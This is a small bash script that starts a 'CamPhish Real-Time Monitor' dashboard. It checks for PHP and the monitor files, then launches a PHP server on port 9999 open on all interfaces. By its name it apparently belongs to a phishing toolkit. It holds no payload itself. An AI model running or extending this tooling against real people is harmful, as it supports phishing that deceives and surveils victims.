#!/bin/bash

# CamPhish Real-Time Monitor
# This script starts the monitoring dashboard

printf "\e[1;92m[+] CamPhish Real-Time Monitor\e[0m\n"
printf "\e[1;92m[+] Starting monitoring dashboard...\e[0m\n"

# Check if PHP is available
if ! command -v php >/dev/null 2>&1; then
    printf "\e[1;31m[!] ERROR: PHP not found. Please install PHP first.\e[0m\n"
    exit 1
fi

# Check if monitor files exist
if [[ ! -f "monitor.php" ]] || [[ ! -f "monitor.html" ]]; then
    printf "\e[1;31m[!] ERROR: Monitor files not found.\e[0m\n"
    exit 1
fi

# Start PHP server for monitor
MONITOR_PORT="9999"
printf "\e[1;92m[+] Starting monitor on http://localhost:$MONITOR_PORT\e[0m\n"
printf "\e[1;92m[+] Monitor URL: http://localhost:$MONITOR_PORT/monitor.html\e[0m\n"
printf "\e[1;92m[+] Press Ctrl+C to stop monitoring\e[0m\n"

# Start PHP server
php -S 0.0.0.0:$MONITOR_PORT
